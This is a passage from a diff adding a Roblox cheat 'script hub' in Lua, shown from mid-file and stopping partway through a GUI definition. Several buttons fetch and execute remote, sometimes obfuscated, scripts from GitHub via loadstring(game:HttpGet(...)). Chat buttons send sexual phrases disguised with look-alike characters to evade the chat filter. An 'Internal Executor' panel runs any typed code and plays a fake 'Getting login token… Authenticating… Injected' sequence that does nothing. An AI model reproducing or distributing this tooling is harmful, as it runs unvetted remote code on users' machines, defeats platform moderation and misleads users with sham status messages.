+      		Chat("i ain't ฤay 50$ is 50$")
+  	end    
+})
+
+Tab7:AddButton({
+	Name = "I ain't sex but 50$ is 50$",
+	Callback = function()
+      		Chat("i ain't ลex 50$ is 50$")
+  	end    
+})
+
+Tab7:AddButton({
+	Name = "I ain't sex but 20$ is 20$",
+	Callback = function()
+      		Chat("i ain't ลex 20$ is 20$")
+  	end    
+})
+
+Tab7:AddButton({
+	Name = "I ain't have dick 20$ is 20$",
+	Callback = function()
+      		Chat("I ain't have dรฎcฤท 20$ is 20$")
+  	end    
+})
+
+Tab7:AddButton({
+	Name = "I ain't have dick 50$ is 50$",
+	Callback = function()
+      		Chat("I ain't have dรฎcฤท 50$ is 50$")
+  	end    
+})
+
+Tab7:AddButton({
+	Name = "I ain't have cock 20$ is 20$",
+	Callback = function()
+      		Chat("I ain't have ฤรถcฤท 20$ is 20$")
+  	end    
+})
+
+Tab7:AddButton({
+	Name = "I ain't have cock 50$ is 50$",
+	Callback = function()
+      		Chat("I ain't have ฤรถcฤท 50$ is 50$")
+  	end    
+})
+
+end) 
+
+Tab:CreateButton("universal TRASHH",function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/smchko/im-genius/main/universal%20good%20script"))()
+end) 
+
+Tab:CreateButton("Chiezzy Hub",function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/chiepz/aslbnmnkhby7e/main/crqhryvjahdjwysrnegsf%5Csgd"))()
+end) 
+
+Tab:CreateButton("Keyboard Gui",function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/FreezyWare/Roblox/main/utility/Keyboard.lua"))()
+end) 
+
+Tab:CreateButton("Malay hub V3",function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/OpscriptPRO/OP-script/main/Malay%20hub%20V3"))()
+end) 
+
+Tab:CreateButton("DioHub V4",function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/qAxAp/Dio-HubV4/main/DiohubV4_Obf.txt"))()
+end) 
+
+Tab:CreateButton("Manny Hub",function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/uvgame/mannyhub/main/launcher"))()
+end) 
+
+Tab:CreateButton("Solara Gui",function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/nseinkkk/SolaraScript/main/SolaraGUI.lua"))()
+end) 
+
+Tab:CreateButton("Internal Executor",function()
+local players = game:GetService("Players")
+local tweenService = game:GetService("TweenService")
+local runService = game:GetService("RunService")
+local coreGui = game:GetService("CoreGui")
+local viewport = workspace.CurrentCamera.ViewportSize
+
+local function GenerateRandomString(length)
+	local chars = {}
+	for i = 1, length do
+		local char = string.char(math.random(65, 90))
+		if math.random() > 0.5 then
+			char = string.char(math.random(97, 122))
+		end
+		table.insert(chars, char)
+	end
+	return table.concat(chars)
+end
+
+local Element = {}
+
+local ImGui = Instance.new("ScreenGui", runService:IsStudio() and players.LocalPlayer:WaitForChild("PlayerGui") or coreGui);
+ImGui.IgnoreGuiInset = true
+ImGui.ScreenInsets = Enum.ScreenInsets.DeviceSafeInsets
+ImGui.Name = string.format("[%s] [%s] [%s]", GenerateRandomString(5), GenerateRandomString(5), GenerateRandomString(5))
+ImGui.ResetOnSpawn = false
+ImGui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
+
+local Main = Instance.new("Frame", ImGui)
+Main.Active = true
+Main.BorderSizePixel = 0
+Main.BackgroundColor3 = Color3.fromRGB(23, 20, 19)
+Main.Selectable = true
+Main.Size = UDim2.new(0, 530, 0, 330)
+Main.Position = UDim2.fromOffset((viewport.X/2) - (Main.Size.X.Offset / 2), (viewport.Y/2) - (Main.Size.Y.Offset / 2));
+Main.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Main.Name = string.format("[%s] [%s] [%s]", GenerateRandomString(5), GenerateRandomString(5), GenerateRandomString(5))
+Main.Draggable = true
+
+local Header = Instance.new("Frame", Main)
+Header.Active = true
+Header.BorderSizePixel = 0
+Header.BackgroundColor3 = Color3.fromRGB(42, 75, 123)
+Header.Size = UDim2.new(1, 0, 0, 23)
+Header.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Header.Name = string.format("[%s] [%s] [%s]", GenerateRandomString(5), GenerateRandomString(5), GenerateRandomString(5))
+
+local Title = Instance.new("TextLabel", Header)
+Title.Active = true
+Title.TextTruncate = Enum.TextTruncate.AtEnd
+Title.BorderSizePixel = 0
+Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Title.TextSize = 14
+Title.FontFace = Font.new("rbxasset://fonts/families/Inconsolata.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal)
+Title.TextColor3 = Color3.fromRGB(231, 231, 231)
+Title.BackgroundTransparency = 1
+Title.AnchorPoint = Vector2.new(0.5, 0.5)
+Title.Size = UDim2.new(0, 0, 0, 15)
+Title.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Title.Text = "Internal Executor"
+Title.AutomaticSize = Enum.AutomaticSize.X
+Title.Name = string.format("[%s] [%s] [%s]", GenerateRandomString(5), GenerateRandomString(5), GenerateRandomString(5))
+Title.Position = UDim2.new(0.5, 0, 0.5, 0)
+
+local UIPadding = Instance.new("UIPadding", Title)
+UIPadding.PaddingTop = UDim.new(0, 1)
+
+local UISizeConstraint = Instance.new("UISizeConstraint", Title)
+UISizeConstraint.MinSize = Vector2.new(0, 15)
+UISizeConstraint.MaxSize = Vector2.new(250, 15)
+
+local MiniBtn = Instance.new("Frame", Header)
+MiniBtn.Active = true
+MiniBtn.BorderSizePixel = 0
+MiniBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+MiniBtn.AnchorPoint = Vector2.new(0, 0.5)
+MiniBtn.ClipsDescendants = true
+MiniBtn.Size = UDim2.new(0, 18, 0, 18)
+MiniBtn.Position = UDim2.new(0, 5, 0.5, 0)
+MiniBtn.BorderColor3 = Color3.fromRGB(0, 0, 0)
+MiniBtn.Name = string.format("[%s] [%s] [%s]", GenerateRandomString(5), GenerateRandomString(5), GenerateRandomString(5))
+MiniBtn.BackgroundTransparency = 1
+
+local Icon = Instance.new("ImageButton", MiniBtn)
+Icon.Active = true
+Icon.BorderSizePixel = 0
+Icon.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Icon.AnchorPoint = Vector2.new(0.5, 0.5)
+Icon.Image = "rbxassetid://18690610035"
+Icon.Size = UDim2.new(0, 11, 0, 11)
+Icon.ClipsDescendants = true
+Icon.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Icon.BackgroundTransparency = 1
+Icon.Name = string.format("[%s] [%s] [%s]", GenerateRandomString(5), GenerateRandomString(5), GenerateRandomString(5))
+Icon.Position = UDim2.new(0.5, 0, 0.5, 0)
+
+local ExitBtn = Instance.new("Frame", Header)
+ExitBtn.Active = true
+ExitBtn.BorderSizePixel = 0
+ExitBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ExitBtn.AnchorPoint = Vector2.new(1, 0.5)
+ExitBtn.ClipsDescendants = true
+ExitBtn.Size = UDim2.new(0, 18, 0, 18)
+ExitBtn.Position = UDim2.new(1, -5, 0.5, 0)
+ExitBtn.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ExitBtn.Name = string.format("[%s] [%s] [%s]", GenerateRandomString(5), GenerateRandomString(5), GenerateRandomString(5))
+ExitBtn.BackgroundTransparency = 1
+
+local ExitIcon = Instance.new("ImageButton", ExitBtn)
+ExitIcon.Active = true
+ExitIcon.BorderSizePixel = 0
+ExitIcon.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ExitIcon.AnchorPoint = Vector2.new(0.5, 0.5)
+ExitIcon.Image = "rbxassetid://10747384394"
+ExitIcon.Size = UDim2.new(1, 0, 1, 0)
+ExitIcon.ClipsDescendants = true
+ExitIcon.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ExitIcon.BackgroundTransparency = 1
+ExitIcon.Name = string.format("[%s] [%s] [%s]", GenerateRandomString(5), GenerateRandomString(5), GenerateRandomString(5))
+ExitIcon.Position = UDim2.new(0.5, 0, 0.5, 0)
+
+local TabContainer = Instance.new("Frame", Main)
+TabContainer.Active = true
+TabContainer.BorderSizePixel = 0
+TabContainer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TabContainer.Size = UDim2.new(1, 0, 0, 35)
+TabContainer.Position = UDim2.new(0, 0, 0, 25)
+TabContainer.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TabContainer.Name = string.format("[%s] [%s] [%s]", GenerateRandomString(5), GenerateRandomString(5), GenerateRandomString(5))
+TabContainer.BackgroundTransparency = 1
+
+local TabHolder = Instance.new("ScrollingFrame", TabContainer)
+TabHolder.Active = true
+TabHolder.BorderSizePixel = 0
+TabHolder.CanvasSize = UDim2.new(0, 0, 0, 0)
+TabHolder.TopImage = ""
+TabHolder.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TabHolder.Name = string.format("[%s] [%s] [%s]", GenerateRandomString(5), GenerateRandomString(5), GenerateRandomString(5))
+TabHolder.BottomImage = ""
+TabHolder.AutomaticCanvasSize = Enum.AutomaticSize.X
+TabHolder.Size = UDim2.new(1, -10, 1, 0)
+TabHolder.ScrollBarImageColor3 = Color3.fromRGB(0, 0, 0)
+TabHolder.Position = UDim2.new(0, 5, 0, 0)
+TabHolder.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TabHolder.ScrollBarThickness = 0
+TabHolder.BackgroundTransparency = 1
+
+local UIListLayout = Instance.new("UIListLayout", TabHolder)
+UIListLayout.Padding = UDim.new(0, 5)
+UIListLayout.VerticalAlignment = Enum.VerticalAlignment.Bottom
+UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+UIListLayout.FillDirection = Enum.FillDirection.Horizontal
+
+local activeTab = nil
+
+function Element:Tab(title)
+	local Tab = Instance.new("TextButton", TabHolder)
+	Tab.BorderSizePixel = 0
+	Tab.TextSize = 14
+	Tab.TextColor3 = Color3.fromRGB(231, 231, 231)
+	Tab.BackgroundColor3 = Color3.fromRGB(35, 61, 92)
+	Tab.FontFace = Font.new("rbxasset://fonts/families/Inconsolata.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+	Tab.AutomaticSize = Enum.AutomaticSize.X
+	Tab.Size = UDim2.new(0, 0, 0, 25)
+	Tab.Name = string.format("[%s] [%s] [%s]", GenerateRandomString(5), GenerateRandomString(5), GenerateRandomString(5))
+	Tab.BorderColor3 = Color3.fromRGB(0, 0, 0)
+	Tab.Text = title or "Tab"
+
+	local UICorner = Instance.new("UICorner", Tab)
+	UICorner.CornerRadius = UDim.new(0, 3)
+
+	local CoverUp = Instance.new("Frame", Tab)
+	CoverUp.Active = true
+	CoverUp.BorderSizePixel = 0
+	CoverUp.BackgroundColor3 = Color3.fromRGB(35, 61, 92)
+	CoverUp.AnchorPoint = Vector2.new(0, 1)
+	CoverUp.ClipsDescendants = true
+	CoverUp.Size = UDim2.new(1, 0, 0, 5)
+	CoverUp.Position = UDim2.new(0, 0, 1, 0)
+	CoverUp.BorderColor3 = Color3.fromRGB(0, 0, 0)
+	CoverUp.Name = string.format("[%s] [%s] [%s]", GenerateRandomString(5), GenerateRandomString(5), GenerateRandomString(5))
+
+	runService.RenderStepped:Wait()
+	local newSize = Tab.TextBounds.X + 10
+	Tab.Size = UDim2.new(0, newSize, 0, 25)
+
+	local function updateTabColor(tab, cover, isActive)
+		if isActive then
+			tab.BackgroundColor3 = Color3.fromRGB(56, 123, 201)
+			cover.BackgroundColor3 = Color3.fromRGB(56, 123, 201)
+		else
+			tab.BackgroundColor3 = Color3.fromRGB(35, 61, 92)
+			cover.BackgroundColor3 = Color3.fromRGB(35, 61, 92)
+		end
+	end
+
+	if not activeTab then
+		activeTab = Tab
+		updateTabColor(Tab, CoverUp, true)
+	end
+
+	Tab.MouseEnter:Connect(function()
+		if activeTab ~= Tab then
+			Tab.BackgroundColor3 = Color3.fromRGB(60, 105, 157)
+			CoverUp.BackgroundColor3 = Color3.fromRGB(60, 105, 157)
+		end
+	end)
+
+	Tab.MouseLeave:Connect(function()
+		if activeTab ~= Tab then
+			updateTabColor(Tab, CoverUp, false)
+		end
+	end)
+
+	Tab.MouseButton1Click:Connect(function()
+		if activeTab ~= Tab then
+			updateTabColor(activeTab, activeTab:FindFirstChildWhichIsA("Frame"), false)
+			activeTab = Tab
+			updateTabColor(Tab, CoverUp, true)
+		end
+	end)
+end
+
+local Divider = Instance.new("Frame", TabContainer)
+Divider.Active = true
+Divider.BorderSizePixel = 0
+Divider.BackgroundColor3 = Color3.fromRGB(56, 119, 194)
+Divider.AnchorPoint = Vector2.new(0.5, 1)
+Divider.ClipsDescendants = true
+Divider.Size = UDim2.new(1, -10, 0, 1)
+Divider.Position = UDim2.new(0.5, 0, 1, 0)
+Divider.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Divider.Name = string.format("[%s] [%s] [%s]", GenerateRandomString(5), GenerateRandomString(5), GenerateRandomString(5))
+
+local MainContainer = Instance.new("Frame", Main)
+MainContainer.Active = true
+MainContainer.BorderSizePixel = 0
+MainContainer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+MainContainer.Size = UDim2.new(1, -10, 1.01515, -70)
+MainContainer.Position = UDim2.new(0, 5, 0, 65)
+MainContainer.BorderColor3 = Color3.fromRGB(0, 0, 0)
+MainContainer.Name = string.format("[%s] [%s] [%s]", GenerateRandomString(5), GenerateRandomString(5), GenerateRandomString(5))
+MainContainer.BackgroundTransparency = 1
+
+local TextEditorHolder = Instance.new("Frame", MainContainer)
+TextEditorHolder.Active = true
+TextEditorHolder.BorderSizePixel = 0
+TextEditorHolder.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
+TextEditorHolder.ClipsDescendants = true
+TextEditorHolder.Size = UDim2.new(1, 0, 1, -30)
+TextEditorHolder.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextEditorHolder.Name = string.format("[%s] [%s] [%s]", GenerateRandomString(5), GenerateRandomString(5), GenerateRandomString(5))
+
+local LineContainer = Instance.new("Frame", TextEditorHolder)
+LineContainer.Active = true
+LineContainer.BorderSizePixel = 0
+LineContainer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+LineContainer.ClipsDescendants = true
+LineContainer.Size = UDim2.new(0, 30, 1, 0)
+LineContainer.BorderColor3 = Color3.fromRGB(0, 0, 0)
+LineContainer.Name = string.format("[%s] [%s] [%s]", GenerateRandomString(5), GenerateRandomString(5), GenerateRandomString(5))
+LineContainer.BackgroundTransparency = 1
+
+local Divider = Instance.new("Frame", LineContainer)
+Divider.Active = true
+Divider.BorderSizePixel = 0
+Divider.BackgroundColor3 = Color3.fromRGB(51, 51, 51)
+Divider.AnchorPoint = Vector2.new(1, 0.5)
+Divider.ClipsDescendants = true
+Divider.Size = UDim2.new(0, 1, 1, -10)
+Divider.Position = UDim2.new(1, 0, 0.5, 0)
+Divider.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Divider.Name = string.format("[%s] [%s] [%s]", GenerateRandomString(5), GenerateRandomString(5), GenerateRandomString(5))
+
+local LineHolder = Instance.new("ScrollingFrame", LineContainer)
+LineHolder.Active = true
+LineHolder.ScrollingDirection = Enum.ScrollingDirection.Y
+LineHolder.BorderSizePixel = 0
+LineHolder.CanvasSize = UDim2.new(0, 0, 0, 0)
+LineHolder.TopImage = ""
+LineHolder.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+LineHolder.Name = string.format("[%s] [%s] [%s]", GenerateRandomString(5), GenerateRandomString(5), GenerateRandomString(5))
+LineHolder.BottomImage = ""
+LineHolder.AnchorPoint = Vector2.new(0, 0.5)
+LineHolder.AutomaticCanvasSize = Enum.AutomaticSize.Y
+LineHolder.Size = UDim2.new(1, 0, 1, -10)
+LineHolder.ScrollBarImageColor3 = Color3.fromRGB(0, 0, 0)
+LineHolder.Position = UDim2.new(0, 0, 0.5, 0)
+LineHolder.BorderColor3 = Color3.fromRGB(0, 0, 0)
+LineHolder.ScrollBarThickness = 0
+LineHolder.BackgroundTransparency = 1
+
+local Line = Instance.new("TextLabel", LineHolder)
+Line.Active = true
+Line.TextTruncate = Enum.TextTruncate.AtEnd
+Line.BorderSizePixel = 0
+Line.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Line.TextSize = 14
+Line.FontFace = Font.new("rbxasset://fonts/families/Inconsolata.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+Line.TextColor3 = Color3.fromRGB(201, 201, 201)
+Line.BackgroundTransparency = 1
+Line.RichText = true
+Line.Size = UDim2.new(0, 20, 0, 20)
+Line.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Line.Text = "1"
+Line.Name = string.format("[%s] [%s] [%s]", GenerateRandomString(5), GenerateRandomString(5), GenerateRandomString(5))
+
+local UIListLayout = Instance.new("UIListLayout", LineHolder)
+UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+
+local EditorContainer = Instance.new("Frame", TextEditorHolder)
+EditorContainer.Active = true
+EditorContainer.BorderSizePixel = 0
+EditorContainer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+EditorContainer.ClipsDescendants = true
+EditorContainer.Size = UDim2.new(1, -40, 1, -10)
+EditorContainer.Position = UDim2.new(0, 35, 0, 5)
+EditorContainer.BorderColor3 = Color3.fromRGB(0, 0, 0)
+EditorContainer.Name = string.format("[%s] [%s] [%s]", GenerateRandomString(5), GenerateRandomString(5), GenerateRandomString(5))
+EditorContainer.BackgroundTransparency = 1
+
+local EditorHolder = Instance.new("ScrollingFrame", EditorContainer)
+EditorHolder.Active = true
+EditorHolder.BorderSizePixel = 0
+EditorHolder.CanvasSize = UDim2.new(0, 0, 0, 0)
+EditorHolder.TopImage = ""
+EditorHolder.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+EditorHolder.Name = string.format("[%s] [%s] [%s]", GenerateRandomString(5), GenerateRandomString(5), GenerateRandomString(5))
+EditorHolder.BottomImage = ""
+EditorHolder.AutomaticCanvasSize = Enum.AutomaticSize.XY
+EditorHolder.Size = UDim2.new(1, 0, 1, 0)
+EditorHolder.ScrollBarImageColor3 = Color3.fromRGB(201, 201, 201)
+EditorHolder.BorderColor3 = Color3.fromRGB(0, 0, 0)
+EditorHolder.ScrollBarThickness = 3
+EditorHolder.BackgroundTransparency = 1
+
+local TextBox = Instance.new("TextBox", EditorHolder)
+TextBox.CursorPosition = -1
+TextBox.TextColor3 = Color3.fromRGB(201, 201, 201)
+TextBox.BorderSizePixel = 0
+TextBox.TextXAlignment = Enum.TextXAlignment.Left
+TextBox.TextSize = 14
+TextBox.TextYAlignment = Enum.TextYAlignment.Top
+TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextBox.FontFace = Font.new("rbxasset://fonts/families/Inconsolata.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+TextBox.RichText = true
+TextBox.AutomaticSize = Enum.AutomaticSize.XY
+TextBox.MultiLine = true
+TextBox.ClearTextOnFocus = false
+TextBox.PlaceholderText = 'print("Hello World"!)'
+TextBox.Size = UDim2.new(1, 0, 1, 0)
+TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextBox.Text = ""
+TextBox.BackgroundTransparency = 1
+TextBox.Name = string.format("[%s] [%s] [%s]", GenerateRandomString(5), GenerateRandomString(5), GenerateRandomString(5))
+
+local UIPadding = Instance.new("UIPadding", TextBox)
+UIPadding.PaddingTop = UDim.new(0, 2)
+UIPadding.PaddingLeft = UDim.new(0, 5)
+
+local ButtonContainer = Instance.new("Frame", MainContainer)
+ButtonContainer.Active = true
+ButtonContainer.BorderSizePixel = 0
+ButtonContainer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ButtonContainer.AnchorPoint = Vector2.new(0, 1)
+ButtonContainer.ClipsDescendants = true
+ButtonContainer.Size = UDim2.new(1, 0, 0, 30)
+ButtonContainer.Position = UDim2.new(0, 0, 1, 0)
+ButtonContainer.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ButtonContainer.Name = string.format("[%s] [%s] [%s]", GenerateRandomString(5), GenerateRandomString(5), GenerateRandomString(5))
+ButtonContainer.BackgroundTransparency = 1
+
+local ButtonHolder = Instance.new("ScrollingFrame", ButtonContainer)
+ButtonHolder.Active = true
+ButtonHolder.BorderSizePixel = 0
+ButtonHolder.CanvasSize = UDim2.new(0, 0, 0, 0)
+ButtonHolder.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ButtonHolder.Name = string.format("[%s] [%s] [%s]", GenerateRandomString(5), GenerateRandomString(5), GenerateRandomString(5))
+ButtonHolder.AutomaticCanvasSize = Enum.AutomaticSize.X
+ButtonHolder.Size = UDim2.new(1, -100, 1, 0)
+ButtonHolder.ScrollBarImageColor3 = Color3.fromRGB(0, 0, 0)
+ButtonHolder.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ButtonHolder.ScrollBarThickness = 0
+ButtonHolder.BackgroundTransparency = 1
+
+local ButtonHolderLayout = Instance.new("UIListLayout", ButtonHolder)
+ButtonHolderLayout.Padding = UDim.new(0, 5)
+ButtonHolderLayout.VerticalAlignment = Enum.VerticalAlignment.Center
+ButtonHolderLayout.SortOrder = Enum.SortOrder.LayoutOrder
+ButtonHolderLayout.FillDirection = Enum.FillDirection.Horizontal
+
+-- Element:Button("name")
+function Element:Button(title, callback)
+	local Button = Instance.new("TextButton", ButtonHolder)
+	Button.BorderSizePixel = 0
+	Button.AutoButtonColor = false
+	Button.TextSize = 14
+	Button.TextColor3 = Color3.fromRGB(255, 255, 255)
+	Button.BackgroundColor3 = Color3.fromRGB(67, 151, 251)
+	Button.FontFace = Font.new("rbxasset://fonts/families/Inconsolata.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal)
+	Button.AutomaticSize = Enum.AutomaticSize.XY
+	Button.Size = UDim2.new(0, 10, 0, 0)
+	Button.BackgroundTransparency = 0.5
+	Button.Name = string.format("[%s] [%s] [%s]", GenerateRandomString(5), GenerateRandomString(5), GenerateRandomString(5))
+	Button.Text = title or "Button"
+	Button.Position = UDim2.new(0.18519, 0, 0, 0)
+
+	local UIPaddingExecBtn = Instance.new("UIPadding", Button)
+	UIPaddingExecBtn.PaddingTop = UDim.new(0, 4)
+	UIPaddingExecBtn.PaddingRight = UDim.new(0, 10)
+	UIPaddingExecBtn.PaddingLeft = UDim.new(0, 10)
+	UIPaddingExecBtn.PaddingBottom = UDim.new(0, 4)
+
+	local function animateButtonColor(button, color)
+		button.BackgroundColor3 = color
+	end
+
+	Button.MouseEnter:Connect(function()
+		animateButtonColor(Button, Color3.fromRGB(60, 105, 157))
+	end)
+
+	Button.MouseLeave:Connect(function()
+		animateButtonColor(Button, Color3.fromRGB(67, 151, 251))
+	end)
+
+	Button.MouseButton1Click:Connect(function()
+		if runService:IsStudio() then
+			warn("Execution disabled due to loadstring()")
+		elseif callback then
+			callback()
+		end
+	end)
+end
+
+ExitIcon.MouseButton1Click:Connect(function()
+	ImGui:Destroy()
+end)
+Icon.MouseButton1Click:Connect(function()
+	if Main.Transparency == 0 then
+		Icon.Rotation = 180
+		Main.Transparency = 1
+		MainContainer.Visible = false
+		TabContainer.Visible = false
+		Header.Transparency = 0.3
+	else
+		Icon.Rotation = 0
+		Main.Transparency = 0
+		MainContainer.Visible = true
+		TabContainer.Visible = true
+		Header.Transparency = 0
+	end
+end)
+
+local injected = false
+
+Element:Tab("Execution")
+Element:Tab("Scripts")
+Element:Tab("Settings")
+Element:Tab("Theme")
+
+Element:Button("Execute", function()
+	if injected == true then
+		loadstring(TextBox.Text)()
+		Title.Text = "Internal Executor - Injected"
+	else
+		Title.Text = "Internal Executor - Not Injected"
+		wait(2)
+		Title.Text = "Internal Executor"
+	end
+end)
+Element:Button("Clear", function()
+	TextBox.Text = ""
+end)
+Element:Button("Open", function()
+	
+end)
+Element:Button("File", function()
+	
+end)
+Element:Button("Inject", function()
+	if injected == true then
+		Title.Text = "Internal Executor - Already Injected"
+		wait(2)
+		Title.Text = "Internal Executor - Injected"
+	else
+		Title.Text = "Internal Executor - Getting login token."
+		wait(1)
+		Title.Text = "Internal Executor - Version: 6b63ea89d2e54fd7 | LIVE"
+		wait(1)
+		Title.Text = "Internal Executor - Setting Up."
+		wait(0.5)
+		Title.Text = "Internal Executor - Authenticating."
+		wait(0.5)
+		Title.Text = "Internal Executor - Done!"
+		wait(0.5)
+		Title.Text = "Internal Executor - Injected"
+		injected = true
+	end
+end)
+end) 
+
+Tab:CreateButton("Zylex Executor",function()
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local Epikhackingplace = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local Zyleximage = Instance.new("ImageLabel")
+local TextBox = Instance.new("TextBox")
+local Close = Instance.new("TextButton")
+local UICorner = Instance.new("UICorner")
+local Execute = Instance.new("ImageButton")
+local Clear = Instance.new("ImageButton")
+local Infyeild = Instance.new("TextButton")
+local Pockethublite = Instance.new("TextButton")
+local OpenGUI = Instance.new("TextButton")
+
+--Properties:
+
+Epikhackingplace.Name = "Epik hacking place"
+Epikhackingplace.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+Epikhackingplace.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Frame.Parent = Epikhackingplace
+Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Frame.BorderSizePixel = 0
+Frame.Position = UDim2.new(0.283280075, 0, 0.222333238, 0)
+Frame.Size = UDim2.new(0, 427, 0, 282)
+
+Zyleximage.Name = "Zylex image"
+Zyleximage.Parent = Frame
+Zyleximage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Zyleximage.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Zyleximage.BorderSizePixel = 0
+Zyleximage.Position = UDim2.new(0.358313829, 0, 0.0390070938, 0)
+Zyleximage.Size = UDim2.new(0, 100, 0, 68)
+Zyleximage.Image = "rbxassetid://18275509952"
+
+TextBox.Parent = Frame
+TextBox.BackgroundColor3 = Color3.fromRGB(47, 47, 47)
+TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextBox.BorderSizePixel = 0
+TextBox.Position = UDim2.new(0.114754029, 0, 0.28014183, 0)
+TextBox.Size = UDim2.new(0, 334, 0, 163)
+TextBox.Font = Enum.Font.SourceSans
+TextBox.MultiLine = true
+TextBox.Text = "print"
+TextBox.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextBox.TextSize = 14.000
+TextBox.TextXAlignment = Enum.TextXAlignment.Left
+TextBox.TextYAlignment = Enum.TextYAlignment.Top
+
+Close.Name = "Close"
+Close.Parent = Frame
+Close.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Close.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Close.BorderSizePixel = 0
+Close.Position = UDim2.new(0.866510451, 0, 0, 0)
+Close.Size = UDim2.new(0, 57, 0, 46)
+Close.Font = Enum.Font.SourceSans
+Close.Text = "X"
+Close.TextColor3 = Color3.fromRGB(255, 42, 0)
+Close.TextScaled = true
+Close.TextSize = 14.000
+Close.TextWrapped = true
+
+UICorner.Parent = Frame
+
+Execute.Name = "Execute"
+Execute.Parent = Frame
+Execute.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Execute.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Execute.BorderSizePixel = 0
+Execute.Position = UDim2.new(0.00702568982, 0, 0.858155906, 0)
+Execute.Size = UDim2.new(0, 46, 0, 39)
+Execute.Image = "rbxassetid://18224532618"
+
+Clear.Name = "Clear"
+Clear.Parent = Frame
+Clear.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Clear.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Clear.BorderSizePixel = 0
+Clear.Position = UDim2.new(0.121779859, 0, 0.865248144, 0)
+Clear.Size = UDim2.new(0, 48, 0, 38)
+Clear.Image = "rbxassetid://18224535693"
+
+Infyeild.Name = "Inf yeild"
+Infyeild.Parent = Frame
+Infyeild.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Infyeild.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Infyeild.BorderSizePixel = 0
+Infyeild.Position = UDim2.new(0, 0, 0.258865237, 0)
+Infyeild.Size = UDim2.new(0, 48, 0, 50)
+Infyeild.Font = Enum.Font.SourceSans
+Infyeild.Text = "IY"
+Infyeild.TextColor3 = Color3.fromRGB(255, 255, 255)
+Infyeild.TextSize = 14.000
+
+Pockethublite.Name = "Pocket hub lite"
+Pockethublite.Parent = Frame
+Pockethublite.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Pockethublite.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Pockethublite.BorderSizePixel = 0
+Pockethublite.Position = UDim2.new(0, 0, 0.436170101, 0)
+Pockethublite.Size = UDim2.new(0, 48, 0, 50)
+Pockethublite.Font = Enum.Font.SourceSans
+Pockethublite.Text = "Pocket hub"
+Pockethublite.TextColor3 = Color3.fromRGB(255, 255, 255)
+Pockethublite.TextSize = 10.000
+
+OpenGUI.Name = "Open GUI"
+OpenGUI.Parent = Epikhackingplace
+OpenGUI.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+OpenGUI.BorderColor3 = Color3.fromRGB(0, 0, 0)
+OpenGUI.BorderSizePixel = 0
+OpenGUI.Position = UDim2.new(0.00729927002, 0, 0.331612915, 0)
+OpenGUI.Size = UDim2.new(0, 68, 0, 50)
+OpenGUI.Font = Enum.Font.SourceSans
+OpenGUI.Text = "Open GUI"
+OpenGUI.TextColor3 = Color3.fromRGB(0, 0, 0)
+OpenGUI.TextSize = 14.000
+
